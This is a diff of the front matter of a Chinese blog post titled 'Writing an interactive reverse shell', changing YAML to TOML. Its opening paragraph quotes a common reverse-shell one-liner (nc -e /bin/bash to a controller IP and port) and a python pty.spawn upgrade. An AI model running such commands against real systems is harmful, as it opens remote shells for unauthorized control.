@@ -1,8 +1,9 @@
----
-title: "写一个可交互的反弹 Shell"
-date: 2022-05-02T19:19:57+08:00
-tags: ["linux"]
----
++++
+title = "写一个可交互的反弹 Shell"
+date = 2022-05-02T19:19:57+08:00
+[taxonomies]
+tags = ["linux"]
++++
 
 在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 `nc -e /bin/bash $控制机IP $控制机端口` 弹出一个 Shell，然后再用 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。
 
